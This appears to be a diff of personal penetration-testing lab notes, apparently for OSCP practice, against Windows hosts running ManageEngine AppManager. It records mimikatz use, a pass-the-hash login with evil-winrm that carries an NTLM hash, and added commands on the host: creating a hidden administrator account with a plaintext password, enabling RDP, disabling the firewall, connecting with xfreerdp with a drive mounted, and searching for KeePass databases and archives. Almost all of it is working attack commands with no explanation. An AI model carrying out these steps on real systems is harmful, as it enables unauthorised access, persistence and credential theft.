@@ -28,5 +28,22 @@ C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64>mimikatz.
 └─$ evil-winrm -i 192.168.212.95  -u administrator -H "a51493b0b06e5e35f855245e71af1d14"
 
 
+┌──(kali㉿kali)-[~/lab0/96]
+└─$ mysql -h 192.168.218.96 -u root -p
+
+powershell/lab0/95
+C:\Program Files\ManageEngine\AppManager14\working> net user aries Oscp#1234 /add
+C:\Program Files\ManageEngine\AppManager14\working> net localgroup administrators aries /add
+C:\Program Files\ManageEngine\AppManager14\working> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+C:\Program Files\ManageEngine\AppManager14\working> netsh advfirewall set allprofiles state off
+
+┌──(kali㉿kali)-[~]
+└─$ xfreerdp -v:192.168.218.95 -u:aries -p:'Oscp#1234' +clipboard -cert:ignore -drive:aries,/home/kali/lab0/95
+
+C:\Users\aries>netstat -ano | findstr /R "^ *TCP"
+c:\>dir /s *.kbdx
+c:\>dir /s *.zip 
+
+
 
 
